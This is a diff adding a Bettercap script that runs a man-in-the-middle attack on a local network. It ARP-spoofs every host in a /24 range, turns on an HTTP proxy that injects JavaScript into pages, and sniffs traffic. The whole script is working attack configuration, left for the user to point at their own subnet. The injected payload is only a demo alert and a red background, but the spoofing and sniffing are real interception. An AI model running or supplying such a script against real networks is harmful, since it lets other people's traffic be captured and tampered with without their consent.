@@ -1,0 +1,38 @@
+# DISCOVER HOSTS ON THE NETWORK
+sleep 10
+
+# PROBE THE NETWORK
+net.probe on
+sleep 10
+
+# SHOW THE NETWORK
+net.show
+sleep 2
+
+# TARGET THE ENTIRE LAN AUTOMATICALLY
+set arp.spoof.targets 10.0.0.0/24 ---<CHANGE THIS FOR YOUR NETWORK>
+set arp.spoof.internal true
+sleep 8
+
+# START THE ATTACK MODULES
+arp.spoof on
+sleep 8
+
+# ENABLE HTTP PROXY INJECTION
+set http.proxy.script ""
+sleep 3
+
+# INJECT THE JAVA MESSAGE
+set http.proxy.injectjs "alert('Bettercap MITM Successful!');document.body.style.backgroundColor='red';"
+sleep 5
+
+# TURN ON THE HTTP PROXY
+http.proxy on
+sleep 3
+
+# TURN ON NETWORK SNIFFING
+net.sniff on
+sleep 3
+
+# START STREAMING MESSAGES
+events.stream on
